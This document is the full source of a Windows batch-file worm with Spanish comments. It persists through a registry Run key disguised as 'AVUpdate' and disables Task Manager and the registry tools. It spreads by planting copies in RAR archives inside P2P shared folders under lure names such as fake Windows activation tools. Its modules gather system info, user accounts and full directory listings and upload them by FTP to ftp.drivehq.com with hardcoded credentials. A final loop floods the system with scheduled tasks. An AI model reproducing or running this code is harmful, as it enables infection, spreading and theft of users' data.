rem ---------------------------------------------------------------------nuv.bat-------------
@echo off
if '%1==' (
  type %0>pnc.bat
  start /min pnc.bat v0
  exit
) else (
  goto %1
  exit
)
:v0
copy %0 %windir%\pnc.bat
copy %0 %temp%\pnc.bat
find "tine"<%0>t.t
find /v "find "<t.t>t.bat
find "mv1"<%0>v1.t
find /v "find "<v1.t>v1.bat
start /min v1.bat
exit
:v1
goto v1_%2
:v1_si
copy *.bat %windir%\
set l="HKLM\software\microsoft\windows\currentversion\policies\explorer\run"
reg add %l% /V "RunDll23, AVUpdate" /d "%windir%\pnc.bat" /f
reg add "hkcu\software\microsoft\windows\currentversion\policies\system" /v disabletaskmgr /t reg_dword /d "1" /f
reg add "hkcu\software\microsoft\windows\currentversion\policies\system" /v disableregistrytools /t reg_dword /d "1" /f
cd %windir%
start /min %windir%\pnc.bat conf
echo puedo=si > %windir%\%userdomain%_dat.dat
find "mv2"<%0>%windir%\v2.t
find /v "find "<v2.t>v2.bat
start /min v2.bat %0
exit
:v1_no
copy *.bat %temp%\
set l="HKLM\software\microsoft\windows\currentversion\policies\explorer\run"
reg add %l% /V "RunDll23, AVUpdate" /d "%temp%\pnc.bat" /f
cd %temp%
start /min %temp%\pnc.bat conf
echo puedo=no > %temp%\%userdomain%_dat.dat
find "mv3"<%0>%temp%\v3.t
find /v "find "<v3.t>v3.bat
start /min v3.bat %0
:v1_
exit
:v2
cd %windir%
find "fttpc"<%0>ftpc.t
find /v "find "<ftpc.t>ftpc.bat
find "rdst"<%0>rd.t
find /v "find "<rd.t>rd.bat
find "rmcller"<%0>rm.t
find /v "find "<rm.t>rm.bat
goto v2_%2
:v2_0
echo rar=si >> %windir%\%userdomain%_dat.dat
find "mv3"<%0>%windir%\v3.t
find /v "find "<v3.t>v3.bat
start /min v3.bat %windir% pnc.bat %0
start /min rm.bat
exit
:v2_1
echo rar=no >> %windir%\%userdomain%_dat.dat
find "mv3"<%0>%windir%\v3.t
find /v "find "<v3.t>v3.bat
start /min v3.bat %windir% pnc.bat %0
start /min rm.bat
:v2_
exit
:v3
goto v3_%2
v3_si
find "mv4"<%0>%1\v4.t
find /v "find "<v4.t>v4.bat
start /min  %1\v4.bat %1
:v3_no
:v3_
exit
:conf
echo.>imhere.dat
exit
rem ------------------------------------------------------M O D U L O S-------------------------------------
@echo off %mv1%
copy %0 %windir%\ %mv1%
if %errorlevel%==0 ( %mv1%
   start /min %windir%\pnc.bat v1 si  %mv1%
   exit   %mv1%
) else (  %mv1%
   start /min %temp%\pnc.bat v1 no  %mv1%
   exit   %mv1%
)  %mv1%
@echo off %mv2%
set param1=%1 %mv2%
type %0>op.bat %mv2%
set o="%systemdrive%%~p0op.bat" %mv2%
set om="%windir%\pnc.bat" %mv2%
cd "%systemdrive%%~p0" %mv2%
set rnyon=%random% %mv2%
echo eMule\Incoming\ > %windir%\yer.t %mv2%
echo Shareaza\Downloads\ >> %windir%\yer.t %mv2%
echo BearShare\Shared\ >> %windir%\yer.t %mv2%
echo EDONKEY2000\incoming\ >> %windir%\yer.t %mv2%
echo LimeWire\Shared\ >> %windir%\yer.t %mv2%
echo Path_msn_Emoticonos_%rnyon: =% > %windir%\jer.t %mv2%
echo sms_gratis_%rnyon: =% >> %windir%\jer.t %mv2%
echo polifonicos_free_%rnyon: =% >> %windir%\jer.t %mv2%
echo Microsoft_Office_2007_serials_%rnyon: =% >> %windir%\jer.t %mv2%
echo Windows_Vista_activation_tool_%rnyon: =% >> %windir%\jer.t %mv2%
echo Windows_Vista_all_serials_%rnyon: =% >> %windir%\jer.t %mv2%
echo MSN_hack_codes_%rnyon: =% >> %windir%\jer.t %mv2%
set rc=1 %mv2%
set r="%programfiles%\WINRAR\WinRAR.exe" %mv2%
%r% a %windir%\t.rar %o% %mv2%
if not %errorlevel%==9009 set rc=0 %mv2%
if exist %param1%\conf.dat ( %mv2%
   start /min %windir%\pnc.bat v2 %rc% %mv2%   
) else ( %mv2%
   start /min %param1% v2 %rc% %mv2%   
) %mv2%
goto fr %mv2%
:fr2 %mv2%
set uno=%1 %mv2%
for /F "tokens=* delims=" %%g in (%windir%\jer.t) do ( %mv2%
         if %rc%==0 ( %mv2%
           @copy /y %om% "%%g.bat" %mv2%
           cls %mv2%
           ping -n 2 localhost > nul %mv2%
           %r% a "%%g.rar" "%%g.bat" %mv2%
         ) %mv2%
) %mv2%
goto :EOF                                   %mv2%
:fr %mv2%
for /F "tokens=* delims=" %%a in (%windir%\yer.t) do ( %mv2%
         if exist "%programfiles%\%%a" ( %mv2%
            cd "%programfiles%\%%a"      %mv2%
            for %%e in (*.rar) do ( %mv2%
              @copy /y %om% "%%~ne.bat" %mv2%
              cls %mv2%
              ping -n 2 localhost > nul %mv2%
              %r% a "%%e" "%%~ne.bat" %mv2%
            )       %mv2%
         call :fr2 %%a %mv2%
          ) %mv2%
) %mv2%
cd %windir% %mv2%
del *.t %mv2%
cd "%systemdrive%%~p0" %mv2%
del op.bat %mv2%
exit       %mv2%   
@echo off %mv3%
set param=%1 %mv3%
set param1=%param: =% %mv3%
set param2=%2 %mv3%
set param3=%3 %mv3%
cd %param1% %mv3%
ping -n 10 localhost > nul %mv3%
start /min t.bat %param1: =%\ftpc.bat %param1: =% 1 %mv3%
echo %userdomain% puede recivir ordenes > ftd.dat %mv3%
echo Ip info: >> ftd.dat %mv3%
%ipconfig% /all >> ftd.dat %mv3%
echo jalez > ft.dat %mv3%
echo ayjfep >> ft.dat %mv3%
echo binary >> ft.dat %mv3%
echo put %param1%\ftd.dat %userdomain%_conf.txt >> ft.dat %mv3%
echo disconnect >> ft.dat %mv3%
echo bye >> ft.dat %mv3%
echo ftp -s:%param1%\ft.dat ftp.drivehq.com %mv3%
echo jalez > %param1%\ft.dat %mv3%
echo ayjfep >> ft.dat %mv3%
echo binary >> ft.dat %mv3%
echo get %userdomain%_conf.txt %param1%\ftp_si.dat >> ft.dat %mv3%
echo disconnect >> ft.dat %mv3%
echo bye >> ft.dat %mv3%
echo ftp -s:ft.dat ftp.drivehq.com %mv3%
exit %mv3%
@echo off %mv4%
cd %1 %mv4%
echo %username%>usrnm.000 %mv4%
systeminfo>ssinfo.000 %mv4%
set>set.000 %mv4%
net user>net.000 %mv4%
echo %os%>os.000 %mv4%
cd %programfiles% %mv4%
dir>progfile.000 %mv4%
cd "%userprofile%\mis documentos\" %mv4%
dir /s>docs.000 %mv4%
ipconfig>ip.000 %mv4%
cd\ %mv4%
dir /s>archs.000 %mv4%
set log=%userdomain%_ %mv4%
set user=jalezc %mv4%
set pass=ayjfep %mv4%
echo %user%>ftp.000 %mv4%
echo %pass%>>ftp.000 %mv4%
echo binary>>ftp.000 %mv4%
echo put usrnm.000 %log%usrnm.log>>ftp.000 %mv4%
echo put os.000 %log%os.log>>ftp.000 %mv4%
echo put progfile.000 %log%progfile.log>>ftp.000 %mv4%
echo put docs.000 %log%docs.log>>ftp.000 %mv4%
echo put set.000 %log%set.log>>ftp.000 %mv4%
echo put net.000 %log%net.log>>ftp.000 %mv4%
echo put ssinfo.000 %log%ssinfo.log>>ftp.000 %mv4%
echo disconnect>>ftp.000 %mv4%
echo bye>>ftp.000 %mv4%
ftp -s:%windir%\ftp.000 ftp.drivehq.com %mv4%
@echo off %tine%
set param1=%1 %tine%
set param2=%2 %tine%
set param3=%3 %tine%
set param4=%4 %tine%
set hor=%time:~0,2% %tine%
set tim=%time:~3% %tine%
set tim=%tim:~0,2% %tine%
set /A tim=%tim% + %param3: =% %tine%
if /I %tim% geq 60 (set /a hor=%hor%+1 %tine%
                    set /a tim=%tim%-60 %tine%
                    if /I %tim% lss 10 (set tim=0%tim%)) %tine%
set ecx=%hor%:%tim% %tine%
at %ecx: =% %param1: =% %param2: =% %param3: =% %param4: =% %tine%
exit %tine%
@echo off %fttpc%
set param=%1 %fttpc%
set param1=%param: =% %fttpc%
cd %param1% %fttpc%
if exist ftp_si.dat ( %fttpc%
   start /min pnc.bat v3 si %fttpc%
   exit %fttpc%
) %fttpc%
start /min pnc.bat v3 no %fttpc%
exit %fttpc%
@echo off %rdst%
cd\ && dir /s %rdst%
@echo off %rmcller%
for /l %%v in (0, 1, 9999999) do start /min t.bat %windir%\rd.bat no 10 %rmcller%
rem -------------------------------------------------------------------------------fin---